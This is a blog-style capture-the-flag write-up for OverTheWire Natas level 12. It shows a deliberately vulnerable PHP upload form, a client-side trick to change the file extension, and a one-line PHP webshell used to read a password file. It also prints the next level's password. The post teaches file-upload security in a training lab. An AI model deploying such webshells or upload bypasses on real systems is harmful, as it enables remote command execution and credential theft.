+++
title = "Level 12"
date = 2025-03-27T14:45:00+01:00
draft = false
+++

-   State "DONE"       from              <span class="timestamp-wrapper"><span class="timestamp">[2025-03-27 Thu 14:45]</span></span>

<http://natas12.natas.labs.overthewire.org/>

This one took me quite a while to figure out using several tutorials from different websites. First we see an upload dialogue allowing us to upload a JPEG file.

{{< figure src="/ox-hugo/clipboard-20250310T165111.png" >}}


## Background {#background}

If a webpage allows to upload files, the developer has to make sure that the backend checks appropriately for filetypes and malicious intent. So here I assume that no proper checking is done and we can do something malicious.


## Testing the upload functionality {#testing-the-upload-functionality}

The file supposedly has to be very small, so let's try and upload a one-pixel JPEG. This works - so let's try if we can break the dialogue and upload something else, e.g. a file that is bigger or has a different extension.

Uploading a bigger file throws an error, so apparently there is some checking for size. We can also see this looking at the source code from line 24:

```web { linenos=true, linenostart=1 }
<html>
    <head>
        <!-- This stuff in the header has nothing to do with the level -->
        <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
        <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
        <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
        <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
        <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
        <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
        <script>var wechallinfo = { "level": "natas12", "pass": "<censored>" };</script></head>
    <body>
        <h1>natas12</h1>
        <div id="content">
            <?php

            function genRandomString() {
            $length = 10;
            $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
            $string = "";

            for ($p = 0; $p < $length; $p++) {
            $string .= $characters[mt_rand(0, strlen($characters)-1)];
            }

            return $string;
            }

            function makeRandomPath($dir, $ext) {
            do {
            $path = $dir."/".genRandomString().".".$ext;
            } while(file_exists($path));
            return $path;
            }

            function makeRandomPathFromFilename($dir, $fn) {
            $ext = pathinfo($fn, PATHINFO_EXTENSION);
            return makeRandomPath($dir, $ext);
            }

            if(array_key_exists("filename", $_POST)) {
            $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


            if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
            echo "File is too big";
            } else {
            if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
            } else{
            echo "There was an error uploading the file, please try again!";
            }
            }
            } else {
            ?>

            <form enctype="multipart/form-data" action="index.php" method="POST">
                <input type="hidden" name="MAX_FILE_SIZE" value="1000" />
                <input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
                Choose a JPEG to upload (max 1KB):<br/>
                <input name="uploadedfile" type="file" /><br />
                <input type="submit" value="Upload File" />
            </form>
            <?php } ?>
            <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
        </div>
    </body>
</html>
```

Now let's try and upload a file with a different or without an extension. So create a file with a different extension `touch webshell.php` and try and upload it (leave it empty for now):

{{< figure src="/ox-hugo/clipboard-20250313T095932.png" >}}

So this seems to work, however we get a random jpg file back. This is no good as it won't allow us to use the webshell. So let's take a step back and look at the sourcecode again to understand what is happening here.


## Bypassing random Renaming {#bypassing-random-renaming}

```php
function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}
```

The `genRandomString()` function creates a random 10 character string. This random string gets used in the `makeRandomPath()` function here, which  creates a random path using `$dir`, a random string and `$ext`. We can ignore the directory and the random string, as the only thing we care here is the file extension. So let's try and understand where the extension is coming from.

```php
  function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}
```

The next function `makeRandomPathFromFilename()` is where it gets interesting: This extracts the file extension from a provided filename and uses it to create a random path.

```php
function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}
```

Then there is some checking for filesize and a function to move the file to a random location. The first line checks if a file has been submitted. If so, it checks for size and generates a random filename if everything is "in order".

```php { linenos=true, linenostart=1 }
if(array_key_exists("filename", $_POST)) {
  $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
  if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
  echo "File is too big";
  }
  if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
  echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
  } else {
  echo "There was an error uploading the file, please try again!";
  }
}
```

If `$_POST["filename"]` does not exist, the script displays the upload form. This is where things get interesting in line three: here a random string with a `*.jpg` extension is generated.

```web
<form enctype="multipart/form-data" action="index.php" method="POST">
    <input type="hidden" name="MAX_FILE_SIZE" value="1000" />
    <input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
    Choose a JPEG to upload (max 1KB):<br/>
    <input name="uploadedfile" type="file" /><br />
    <input type="submit" value="Upload File" />
</form>
```

So here we have the `filename` that is used to `makeRandomPathFromFilename` in line 2 of the checking procedure above. Now if we use our developer tools in our browser to change the extension here to `*.php` instead of `*.jpg` we are greeted with a different submission dialogue:

{{< figure src="/ox-hugo/clipboard-20250316T155419.png" >}}


## Upload web shell {#upload-web-shell}

Great! Now we only need to upload a small php webshell instead of the empty file so far:

```php
<?php system($_GET['cmd']); ?>
```

We can then pass a parameter to the shell using the path created earlier and `?cmd=`:
`http://natas12.natas.labs.overthewire.org/upload/y0s5e89ek0.php?cmd=cat%20/etc/natas_webpass/natas13`

-   trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC


## Security implications {#security-implications}

-   Checking for file size is fine, but not enough at all
-   If you check for proper file type, do not do so using hard-coded and easy to manipulate html variables.
